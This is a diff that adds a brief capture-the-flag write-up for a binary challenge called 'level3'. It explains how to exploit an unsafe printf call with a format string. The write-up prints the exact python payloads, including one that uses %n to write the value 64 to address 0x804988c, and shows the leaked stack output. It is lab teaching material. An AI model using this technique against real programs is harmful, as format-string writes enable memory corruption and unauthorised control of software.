@@ -1,0 +1,20 @@
+fgets protects againts overflow, we have to change our strategy
+
+wee see by disassembling the "v" function that printf is used on our input,
+And after a variable located at 0x804988c is expected to be 64 to complete the challenge
+
+We can exploit printf, by using the %n specifier, which writes the number of characters printed to the pointer passed in printf
+We can write the adress to be reached in the buffer used by fgets, as it will be on the same stack as printf later
+we can manipulate the adress where the %n modifier will write
+
+python -c "print '\x8c\x98\x04\x08 %p %p %p %p %p %p %p\n'" | ./level3
+returns
+� 0x200 0xb7fd1ac0 0xb7ff37d0 0x804988c 0x20702520 0x25207025 0x70252070
+
+We can see that our adress is in the 4th argument, we just have to make sure our format string before %n
+prints 64 characters exactly.
+I used %+.19d for the three arguments before %n to ensure that each will print 20 characters, plus the 4 for the pointer we have 64.
+
+python -c "print '\x8c\x98\x04\x08%+.19d%+.19d%+.19d%n'" > /tmp/lvl3
+cat /tmp/lvl3 - | ./level3
+And we can get the flag
